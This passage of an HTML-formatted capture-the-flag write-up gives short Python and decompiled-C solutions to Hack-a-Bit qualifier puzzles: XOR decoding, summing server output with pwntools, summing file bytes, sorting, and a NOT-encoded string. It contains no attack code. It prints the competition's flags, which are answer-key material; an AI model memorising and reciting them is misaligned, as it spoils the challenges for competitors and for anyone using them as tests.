&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            time&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sleep(&lt;span style=&#34;color:#ae81ff&#34;&gt;0.1&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;KeyboardInterrupt&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;,end&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\r&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; flag: print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;chr(i &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x9F&lt;/span&gt;)&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, end&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;  &amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;No reversing is needed - just running the file gives the flag &lt;code&gt;flag{this_isnt_spanish_but_i_still_need_an_interpreter}&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;wrench-125&#34;&gt;Wrench (125)&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Think of this challenge like a bolt and go build a wrench.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;Here&amp;rsquo;s your blueprint:&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;Connect to the server on strfjebijc.qualifier.hackabit.com:54321 and get your challenge input. Add up all the decimal integers and only the decminal integers, no hex numbers or strings count. Send that result back within 3 seconds to get the flag&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We are given a bunch of text seperated by newlines when we connect using netcat. The challenge says to add up all decimal numbers, and send the result within 3 seconds. We will use &lt;a href=&#34;https://docs.pwntools.com/en/stable/&#34;&gt;pwntools&lt;/a&gt; to automate this, and do it within 3 seconds.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; string
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; remote(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;strfjebijc.qualifier.hackabit.com&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;54321&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;things &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;total: &amp;#34;&lt;/span&gt;, drop&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decode()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;things &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; things&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;total &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; thing &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; things:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; thing&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;isdigit(): &lt;span style=&#34;color:#75715e&#34;&gt;# check its a decimal number&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        total&lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt;int(thing)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(str(total))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And we get the flag &lt;code&gt;flag{i_feel_the_need_the_need_for_speed}&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;bites-125&#34;&gt;Bites (125)&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Here&amp;rsquo;s a blob of data. Thats it. Just Data. Not any specific data. Just 1&amp;rsquo;s and 0&amp;rsquo;s&amp;hellip;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;Process this file. There are series of bytes from 0x02 to 0xFF. Each of these strings of bytes are surrounded by a null byte (0x00). Finally, there are also byte strings of all 0x01. Your mission is to add up all the bytes in the byte strings that are not 0x01 byte strings. The flag is the integer value of all those bytes added up.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;The &amp;ldquo;flag&amp;rdquo; is just the total sum, no flag{}.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We are given a file, and told to add up all the bytes, apart from &lt;code&gt;0x01&lt;/code&gt;. So we will do just that with python. Note that when looping over a bytes object in python, each element is a number 0-255, which is why it is &lt;code&gt; == 1&lt;/code&gt; instead of &lt;code&gt;== b&amp;quot;\x01&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; Crypto.Util.number &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; bytes_to_long
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;f &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;bites.bin&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;rb&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;total&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; thing &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; f:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; thing &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;pass&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        total&lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt;thing
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(total)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And we get the flag &lt;code&gt;512490&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;speed-150&#34;&gt;Speed (150)&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;You probably shouldn&amp;rsquo;t do this one by hand&amp;hellip; Instead write a sorting algorithm that efficiently organizes this file of numbers smallest to biggest. Your flag is the 52133rd number once sorted, starting from 0. Ie: sorted_numbers[52133].&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;On an average computer, an efficient algorithm should be able to solve this in around 10 seconds.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We are given a large file, and told to sort it, and submit the 51233th item (0-indexed) as the flag. So as always, python is sufficient to solve this, getting the flag &lt;code&gt;1235203980&lt;/code&gt;&lt;/p&gt;

  &lt;img src=&#34;./img/sort.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%;&#34;  /&gt;


&lt;p&gt;No need to code your own algorithm - every language has builtin sorting algorithms already. Though sorting algorithms &lt;em&gt;are&lt;/em&gt; interesting&amp;hellip;&lt;/p&gt;
&lt;p&gt;Small note: I should have done &lt;code&gt;map(int, f)&lt;/code&gt; to convert every string in &lt;code&gt;f&lt;/code&gt; to a number, &lt;em&gt;then&lt;/em&gt; sort, but this didn&amp;rsquo;t matter in this case as with integers only, alphabetical is same as numerical.&lt;/p&gt;
&lt;h2 id=&#34;abundance-150&#34;&gt;Abundance (150)&lt;/h2&gt;
&lt;p&gt;We are given a binary. Decompiling it online at &lt;a href=&#34;https://dogbolt.org/&#34;&gt;dogbolt&lt;/a&gt; recovers some code:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__cdecl&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; argc, &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;argv, &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;envp)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;size_t&lt;/span&gt; v3; &lt;span style=&#34;color:#75715e&#34;&gt;// rbx
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; s[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;]; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+0h] [rbp-C0h] BYREF
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; v6; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+8h] [rbp-B8h]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; v7; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+10h] [rbp-B0h]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; v8; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+18h] [rbp-A8h]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; v9; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+20h] [rbp-A0h]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; s1[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;]; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+30h] [rbp-90h] BYREF
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; v11; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+38h] [rbp-88h]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; v12; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+40h] [rbp-80h]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; v13; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+48h] [rbp-78h]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; v14; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+50h] [rbp-70h]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; v15; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+58h] [rbp-68h]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; v16; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+60h] [rbp-60h]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; v17; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+68h] [rbp-58h]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; v18; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+70h] [rbp-50h]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; v19; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+78h] [rbp-48h]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; v20; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+80h] [rbp-40h]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; v21; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+88h] [rbp-38h]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v22; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+90h] [rbp-30h]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; v23; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+A0h] [rbp-20h]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+ACh] [rbp-14h]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  v23 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3735928559LL&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_QWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)s1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0LL&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  v11 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0LL&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  v12 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0LL&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  v13 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0LL&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  v14 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0LL&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  v15 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0LL&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  v16 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0LL&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  v17 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0LL&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  v18 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0LL&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  v19 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0LL&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  v20 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0LL&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  v21 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0LL&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  v22 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_QWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x90978884989E9399LL&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  v6 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xA08C8B9E978BA09ELL&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  v7 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8B8B8B8B8B90939ELL&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  v8 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x828C9A8B869DA09ELL&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  v9 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ( i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; ; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;i )
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    v3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( v3 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;strlen&lt;/span&gt;(s) )
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    s[i] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;~&lt;/span&gt;s[i];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
